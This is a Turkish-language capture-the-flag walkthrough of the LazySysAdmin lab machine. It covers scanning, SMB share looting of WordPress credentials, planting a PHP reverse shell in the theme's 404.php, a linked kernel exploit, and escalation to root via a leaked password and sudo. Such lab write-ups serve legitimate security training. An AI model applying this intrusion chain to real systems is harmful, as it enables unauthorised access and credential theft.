# Nmap
```
# Nmap 7.91 scan initiated Mon Jan 18 17:28:04 2021 as: nmap -sC -sV -p- -oN log/nmap_initial lazy.vuln
Nmap scan report for lazy.vuln (192.168.56.109)
Host is up (0.00011s latency).
Not shown: 65529 closed ports
PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 b5:38:66:0f:a1:ee:cd:41:69:3b:82:cf:ad:a1:f7:13 (DSA)
|   2048 58:5a:63:69:d0:da:dd:51:cc:c1:6e:00:fd:7e:61:d0 (RSA)
|   256 61:30:f3:55:1a:0d:de:c8:6a:59:5b:c9:9c:b4:92:04 (ECDSA)
|_  256 1f:65:c0:dd:15:e6:e4:21:f2:c1:9b:a3:b6:55:a0:45 (ED25519)
80/tcp   open  http        Apache httpd 2.4.7 ((Ubuntu))
|_http-generator: Silex v2.2.7
| http-robots.txt: 4 disallowed entries 
|_/old/ /test/ /TR2/ /Backnode_files/
|_http-server-header: Apache/2.4.7 (Ubuntu)
|_http-title: Backnode
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
3306/tcp open  mysql       MySQL (unauthorized)
6667/tcp open  irc         InspIRCd
| irc-info: 
|   server: Admin.local
|   users: 1
|   servers: 1
|   chans: 0
|   lusers: 1
|   lservers: 0
|   source ident: nmap
|   source host: 192.168.56.1
|_  error: Closing link: (nmap@192.168.56.1) [Client exited]
Service Info: Hosts: LAZYSYSADMIN, Admin.local; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: -20m02s, deviation: 5h46m24s, median: 2h59m57s
|_nbstat: NetBIOS name: LAZYSYSADMIN, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: lazysysadmin
|   NetBIOS computer name: LAZYSYSADMIN\x00
|   Domain name: \x00
|   FQDN: lazysysadmin
|_  System time: 2021-01-19T03:28:15+10:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2021-01-18T17:28:15
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Jan 18 17:28:27 2021 -- 1 IP address (1 host up) scanned in 22.45 seconds
```

Nmap taramasından SSH,Web servisi,samba,irc, ve mysql portlarının açık olduğunu görüyoruz. Web servisine hızlıca nikto ve dir taraması yapalım.

## NİKTO

```
- Nikto v2.1.6/2.1.5
+ Target Host: lazy.vuln
+ Target Port: 80
+ GET The anti-clickjacking X-Frame-Options header is not present.
+ GET The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ GET The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ OSVDB-3268: GET /old/: Directory indexing found.
+ GET Entry '/old/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ OSVDB-3268: GET /test/: Directory indexing found.
+ GET Entry '/test/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ OSVDB-3268: GET /Backnode_files/: Directory indexing found.
+ GET Entry '/Backnode_files/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ GET "robots.txt" contains 4 entries which should be manually viewed.
+ HEAD Apache/2.4.7 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
+ GET Server may leak inodes via ETags, header found with file /, inode: 8ce8, size: 5560ea23d23c0, mtime: gzip
+ OPTIONS Allowed HTTP Methods: POST, OPTIONS, GET, HEAD 
+ OSVDB-3268: GET /apache/: Directory indexing found.
+ OSVDB-3092: GET /apache/: This might be interesting...
+ OSVDB-3092: GET /old/: This might be interesting...
+ GET Retrieved x-powered-by header: PHP/5.5.9-1ubuntu4.22
+ GET Uncommon header 'x-ob_mode' found, with contents: 0
+ OSVDB-3092: GET /test/: This might be interesting...
+ GET /info.php: Output from the phpinfo() function was found.
+ OSVDB-3233: GET /info.php: PHP is installed, and a test script which runs phpinfo() was found. This gives a lot of system information.
+ OSVDB-3233: GET /icons/README: Apache default file found.
+ OSVDB-5292: GET /info.php?file=http://cirt.net/rfiinc.txt?: RFI from RSnake's list (http://ha.ckers.org/weird/rfi-locations.dat) or from http://osvdb.org/
+ GET /phpmyadmin/: phpMyAdmin directory found
```
Nikto taramasından birkaç klasör çıkıyor kontrol ettikten sonra bu klasörler boş olduğunu ortaya çıkıyor.
Phpmyadmin servisimiz olduğunu görebiliriz birkaç default cred denedikden sonra işe yaramadağından bırakıyorum. wordpress websitesi olduğundan wpscan çalıştırabiliriz ama birde dirsearch çalıştırmak istiyorum.
# Dirs

```
http://lazy.vuln:80/test
http://lazy.vuln:80/wp
http://lazy.vuln:80/apache
http://lazy.vuln:80/old
http://lazy.vuln:80/javascript
http://lazy.vuln:80/phpmyadmin
http://lazy.vuln:80/apache/
http://lazy.vuln:80/index.html
http://lazy.vuln:80/javascript
http://lazy.vuln:80/info.php
http://lazy.vuln:80/old
http://lazy.vuln:80/phpmyadmin
http://lazy.vuln:80/robots.txt
http://lazy.vuln:80/phpmyadmin/index.php
http://lazy.vuln:80/phpmyadmin/
http://lazy.vuln:80/server-status
http://lazy.vuln:80/test
http://lazy.vuln:80/wp
http://lazy.vuln:80/wordpress/wp-login.php
http://lazy.vuln:80/wordpress/
```
dirsearchdan da aynı şeyler çıkıyor tüm dosyaları kontrol ettikten sonra işime yarayacak birşey bulamadığımdan yine geçiyorum.
# Wpscan
```
Interesting Finding(s):

[+] Headers
 | Interesting Entries:
 |  - Server: Apache/2.4.7 (Ubuntu)
 |  - X-Powered-By: PHP/5.5.9-1ubuntu4.22
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://lazy.vuln/wordpress/xmlrpc.php
 | Found By: Link Tag (Passive Detection)
 | Confidence: 100%
 | Confirmed By: Direct Access (Aggressive Detection), 100% confidence
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access

[+] WordPress readme found: http://lazy.vuln/wordpress/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] Registration is enabled: http://lazy.vuln/wordpress/wp-login.php?action=register
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] Upload directory has listing enabled: http://lazy.vuln/wordpress/wp-content/uploads/
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://lazy.vuln/wordpress/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 4.8.1 identified (Insecure, released on 2017-08-02).
 | Found By: Rss Generator (Passive Detection)
 |  - http://lazy.vuln/wordpress/?feed=rss2, <generator>https://wordpress.org/?v=4.8.1</generator>
 |  - http://lazy.vuln/wordpress/?feed=comments-rss2, <generator>https://wordpress.org/?v=4.8.1</generator>

[+] WordPress theme in use: twentyfifteen
 | Location: http://lazy.vuln/wordpress/wp-content/themes/twentyfifteen/
 | Last Updated: 2020-12-09T00:00:00.000Z
 | Readme: http://lazy.vuln/wordpress/wp-content/themes/twentyfifteen/readme.txt
 | [!] The version is out of date, the latest version is 2.8
 | Style URL: http://lazy.vuln/wordpress/wp-content/themes/twentyfifteen/style.css?ver=4.8.1
 | Style Name: Twenty Fifteen
 | Style URI: https://wordpress.org/themes/twentyfifteen/
 | Description: Our 2015 default theme is clean, blog-focused, and designed for clarity. Twenty Fifteen's simple, st...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Css Style In Homepage (Passive Detection)
 |
 | Version: 1.8 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://lazy.vuln/wordpress/wp-content/themes/twentyfifteen/style.css?ver=4.8.1, Match: 'Version: 1.8'

[+] Enumerating All Plugins (via Passive Methods)

[i] No plugins Found.

[+] Enumerating Config Backups (via Passive and Aggressive Methods)
 Checking Config Backups - Time: 00:00:00 <===========================================================================> (22 / 22) 100.00% Time: 00:00:00

[i] No Config Backups Found.

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 50 daily requests by registering at https://wpscan.com/register
```
Wpscan bize twentyfifteen temasının, wp-cron dosyasının olduğunu ve hızlıca göz gezdirip kontrol etmeden samba ya geçiyorum, sambadan birşey çıkmazsa geri dönüp doğru düzgün wpscan aramasını inceleyebilirim.
Bu arada 404.php lokasyonunu not defterine geçiriyorum ki shell için hızımızı düşürmesin.
>http://lazy.vuln/wordpress/wp-content/themes/twentyfifteen/404.php

-------------------

>┌──(adigeefe💀kali)-[ctf/oscp/lazyadmin]

>└─$ smbmap -H  lazy.vuln
```
[+] Guest session   	IP: lazy.vuln:445	Name: unknown                                           
        Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	print$                                            	NO ACCESS	Printer Drivers
	share$                                            	READ ONLY	Sumshare
	IPC$                                              	NO ACCESS	IPC Service (Web server)
```                                                                   
smbmap komutunu çalıştırdığımızda "share$"'in read only olduğunu görebiliyoruz. Hemen smbclient ile incelemek istiyorum.

>┌──(adigeefe💀kali)-[/ctf/oscp/lazyadmin]

>└─$ smbclient \\\\lazy.vuln\\share$

```
Enter WORKGROUP\adigeefe's password: 
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Tue Aug 15 14:05:52 2017
  ..                                  D        0  Mon Aug 14 15:34:47 2017
  wordpress                           D        0  Tue Aug 15 14:21:08 2017
  Backnode_files                      D        0  Mon Aug 14 15:08:26 2017
  wp                                  D        0  Tue Aug 15 13:51:23 2017
  deets.txt                           N      139  Mon Aug 14 15:20:05 2017
  robots.txt                          N       92  Mon Aug 14 15:36:14 2017
  todolist.txt                        N       79  Mon Aug 14 15:39:56 2017
  apache                              D        0  Mon Aug 14 15:35:19 2017
  index.html                          N    36072  Sun Aug  6 08:02:15 2017
  info.php                            N       20  Tue Aug 15 13:55:19 2017
  test                                D        0  Mon Aug 14 15:35:10 2017
  old                                 D        0  Mon Aug 14 15:35:13 2017
```
Bize todolist, deets.txt ve birkaç klasör veriyor. Huyum kurusun direkt wordpress klasörüne koşuyorum. 

```
smb: \> cd wordpress
smb: \wordpress\> ls
  .                                   D        0  Tue Aug 15 14:21:08 2017
  ..                                  D        0  Tue Aug 15 14:05:52 2017
  wp-config-sample.php                N     2853  Wed Dec 16 11:58:26 2015
  wp-trackback.php                    N     4513  Fri Oct 14 22:39:28 2016
  wp-admin                            D        0  Thu Aug  3 00:02:02 2017
  wp-settings.php                     N    16200  Thu Apr  6 21:01:42 2017
  wp-blog-header.php                  N      364  Sat Dec 19 13:20:28 2015
  index.php                           N      418  Wed Sep 25 03:18:11 2013
  wp-cron.php                         N     3286  Sun May 24 20:26:25 2015
  wp-links-opml.php                   N     2422  Mon Nov 21 05:46:30 2016
  readme.html                         N     7413  Mon Dec 12 11:01:39 2016
  wp-signup.php                       N    29924  Tue Jan 24 14:08:42 2017
  wp-content                          D        0  Mon Jan 18 20:54:56 2021
  license.txt                         N    19935  Mon Jan  2 20:58:42 2017
  wp-mail.php                         N     8048  Wed Jan 11 08:13:43 2017
  wp-activate.php                     N     5447  Wed Sep 28 00:36:28 2016
  .htaccess                           H       35  Tue Aug 15 14:40:13 2017
  xmlrpc.php                          N     3065  Wed Aug 31 19:31:29 2016
  wp-login.php                        N    34327  Fri May 12 20:12:46 2017
  wp-load.php                         N     3301  Tue Oct 25 06:15:30 2016
  wp-comments-post.php                N     1627  Mon Aug 29 15:00:32 2016
  wp-config.php                       N     3703  Mon Aug 21 12:25:14 2017
  wp-includes                         D        0  Thu Aug  3 00:02:03 2017

		3029776 blocks of size 1024. 1412952 blocks available

```
Burda gözüme direkt wp-config-sample.php ile wp-config.php dosyası çarpıyor. Wordpress kurarken wp-config.php dosyası olmaz wp-config-sample.php dosyasını wp-config olarak kopyalarız ve içini birkaç ayar için düzenleriz. hemen wp-config dosyasını içinde kritik bilgi olabileceğinden get komutu ile alıyorum 
> smb: \wordpress\> get wp-config.php
> getting file \wordpress\wp-config.php of size 3703 as wp-config.php (602.7 KiloBytes/sec) (average 602.7 KiloBytes/sec)

Çıkış yapmadan hemen diğer terminalime geçerek aldığım dosyayı kontrol ediyorum.
Dosyayı sublime ile açtıktan sonra hassas bilgilerin olduğunu görüyorum.

![](https://i.imgur.com/zpD6jLr.png)

Database user ile database password görünüyor.
Phpmyadmini unutmadan hemen phpmyadmin paneline gidiyorum ve username ve pass'i deniyorum.

![](https://i.imgur.com/Z95u9fy.png)

Giriş başaryıyla gerçekleşiyor. Hemen kullanıcı adı ve şifreyi öğrenmek umuduyla wordpress veritabanına gidiyorum. Soldaki panelden wordpress veritabanına bastıktan sonra wp_users tablosunu getirmesini istiyorum.
![](https://i.imgur.com/Vu9R0gx.png)
Fakat maalesef yetkim olmadığını söylüyor. Duygularım...
Vakit kaybetmeden wordpress de deniyeceğim ve aklımda samba da todolist ve garip bir txt dosyası olduğunu unutmuyorum.

>http://lazy.vuln/wordpress/wp-admin


![](https://i.imgur.com/I2nNb6Z.png)
Kullanıcı adı ve şifrenin başarılı olduğunu görüyor ve hemen kullanıcıları görüntülüyorum.

![](https://i.imgur.com/Nf4642a.png)
Güzel haber tek kullanıcı biziz! Shell alabilmek için Appearance bölümünden Editor'e geldikten sonra 404.php dosyasını seçiyorum.

![](https://i.imgur.com/Ouxp4bL.png)


Aşağdıdaki updatefile butonu dosyayı düzenleme iznimiz olduğunu söylüyor. Yani artık içerde olduğumuzu :) 

![](https://i.imgur.com/6dVENEL.png)


Php reverse shell'i yapıştırdıktan sonra portumu dinlemeye başlıyorum.

![](https://i.imgur.com/L4z6VPN.png)


Yukarıda hızlı olsun diye not aldığım adrese gidiyorum. 

>http://lazy.vuln/wordpress/wp-content/themes/twentyfifteen/404.php

![](https://i.imgur.com/02XUozv.png)


İçerdeyiz! Hızlıca tty spawnlayıp basit kontrolleri yapıyorum.

Kontrollerde linux sürümümüzün 4.4.0-31-generic olduğunu görüyorum ve 
naughtycow diye bir kernel exploiti buluyorum

>https://github.com/kkamagui/linux-kernel-exploits/tree/master/kernel-4.4.0-31-generic/CVE-2016-5195

Fakat birkaç denemeden sonra işe yaramadığını fark ediyorum. Ve tamamen aklımdan çıkan deets.txt ve to-do dosyalarını kontrol etmeye gidiyorum.
get komutu ile çektinten sonra dosyaları kontrol ediyorum.

>┌──(adigeefe💀kali)-[~/ctf/oscp/lazyadmin/smb]

>└─$ cat deets.txt     
```
CBF Remembering all these passwords.

Remember to remove this file and update your password after we push out the server.

Password <censored>
```
>┌──(adigeefe💀kali)-[~/ctf/oscp/lazyadmin/smb]

>└─$ cat todolist.txt 
```
Prevent users from being able to view to web root using the local file browser
```
Ve akıllı abimizin şifresini buraya bıraktığını görüyoruz ve bunu kontrol etmeyip deli gibi wordpresse rushladığımız için kendimizi daha da çok tebrik ediyoruz. Zaten shellimiz olduğu için ssh bağlantısı kurmadan diğer kullanıcıya geçmek istiyorum
/home/ klasörünün içinde togie ismi bizi karşılıyor artık kullanıcı adımızda olduğuna göre;

>su togie

![](https://i.imgur.com/u3eLoBv.png)


```<censored>``` şifresini girdiğimde işe yaradığını görüyorum

![](https://i.imgur.com/7UIUsrO.png)


sudo -l komutu ile herşeye yetkim olduğunu görüyorum yani ctf'in sonuna geldiğimizi.


![](https://i.imgur.com/Wquq5as.png)


sudo su diyerek roota geçiyorum
GG!
